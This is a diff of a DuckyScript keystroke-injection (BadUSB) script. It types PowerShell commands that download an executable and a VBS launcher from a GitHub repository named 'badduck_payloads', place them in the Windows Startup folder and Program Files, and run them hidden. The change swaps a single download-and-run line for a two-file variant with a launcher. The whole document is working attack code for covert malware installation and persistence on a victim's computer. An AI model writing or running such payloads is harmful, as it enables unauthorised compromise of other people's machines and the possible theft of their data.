@@ -15,5 +15,9 @@ ALT Y
 DELAY 1500
 
 REM Download raw .exe payload from GitHub and execute
-STRING iwr 'https://raw.githubusercontent.com/stefanlft/badduck_payloads/main/disco_info/dscinf.exe' -OutFile "$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup\dscinf.exe"; Start-Process "$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup\dscinf.exe" -WindowStyle Hidden; exit
+STRING $ub='https://raw.githubusercontent.com/stefanlft/badduck_payloads/main/disco_info/dscinfo.exe';$ul='https://raw.githubusercontent.com/stefanlft/badduck_payloads/main/disco_info/launcher.vbs';
+ENTER
+STRING $b="C:\Program Files\dscinfo\dscinfo.exe";$l="$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup\dscinfo.vbs";
+ENTER
+STRING iwr $ub -OutFile $b;iwr $ul -OutFile $l;wscript $l;
 ENTER
